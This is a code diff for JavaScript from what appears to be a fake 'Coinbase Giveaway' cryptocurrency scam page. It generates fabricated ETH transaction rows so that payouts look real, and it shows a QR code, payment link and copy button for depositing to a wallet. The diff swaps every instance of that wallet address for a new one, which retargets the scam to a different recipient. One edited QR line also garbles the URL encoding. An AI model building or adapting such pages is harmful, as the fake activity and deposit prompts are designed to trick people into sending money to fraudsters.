@@ -42,7 +42,7 @@ function create_transaction(mins) {
     mins +
     ' mins ago</span> </td> <td><a class="hash-tag text-truncate" href="">' +
     address +
-    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0xCCBEe5f6cd432a4Fa077e76aD30A388663a33821</span> </td> <td>' +
+    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x0B7b9C62BC10bbE74CbDFF39E7F7b3F91A34021f</span> </td> <td>' +
     amount +
     ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
     tx(999) +
@@ -57,7 +57,7 @@ function create_transaction(mins) {
     tx(99999999) +
     '</a></td> <td><span class="timer">' +
     mins +
-    ' mins ago</span></td> <td><span class="hash-tag text-truncate">0xCCBEe5f6cd432a4Fa077e76aD30A388663a33821</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+    ' mins ago</span></td> <td><span class="hash-tag text-truncate">0x0B7b9C62BC10bbE74CbDFF39E7F7b3F91A34021f</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
     address +
     '</a> </td> <td>' +
     send_amount +
@@ -85,7 +85,7 @@ function new_transaction() {
     tx(99999999) +
     '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="">' +
     address +
-    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0xCCBEe5f6cd432a4Fa077e76aD30A388663a33821</span> </td> <td>' +
+    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x0B7b9C62BC10bbE74CbDFF39E7F7b3F91A34021f</span> </td> <td>' +
     amount +
     ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
     tx(999) +
@@ -103,7 +103,7 @@ function new_transaction() {
         generateId(63) +
         '</a> </td> <td class="d-none d-sm-table-cell"><a href="">4' +
         tx(99999999) +
-        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">0xCCBEe5f6cd432a4Fa077e76aD30A388663a33821</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">0x0B7b9C62BC10bbE74CbDFF39E7F7b3F91A34021f</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
         address +
         '</a> </td> <td>' +
         send_amount +
@@ -189,7 +189,7 @@ function update_trans() {
       $('#warn').text(''), $('.pop-body').css('display', 'flex')
       $('#qrcode_svg').attr(
         'src',
-        'https://api.qrserver.com/v1/create-qr-code/?data=ethereum%3A0xCCBEe5f6cd432a4Fa077e76aD30A388663a33821%3Famount%3D' +
+        'https://api.qrserver.com/v1/create-qr-code/?data=ethereum%30x0B7b9C62BC10bbE74CbDFF39E7F7b3F91A34021f%3Famount%3D' +
           amount_entered +
           '%26message%3DDeposit%2Bto%2BCoinbase%2BGiveaway%2B' +
           tm +
@@ -199,7 +199,7 @@ function update_trans() {
         .parent()
         .attr(
           'href',
-          'ethereum:0xCCBEe5f6cd432a4Fa077e76aD30A388663a33821?amount=' +
+          'ethereum:0x0B7b9C62BC10bbE74CbDFF39E7F7b3F91A34021f?amount=' +
             amount_entered +
             '&message=Deposit+to+Coinbase+Giveaway+' +
             tm,
@@ -283,7 +283,7 @@ $('#copy_').mouseout(() => {
 $('#copy_address').click(() => {
   $('#copy_address').attr(
     'data-clipboard-text',
-    '0xCCBEe5f6cd432a4Fa077e76aD30A388663a33821',
+    '0x0B7b9C62BC10bbE74CbDFF39E7F7b3F91A34021f',
   )
   copy_main('copy_address', 'done-copy')
 })
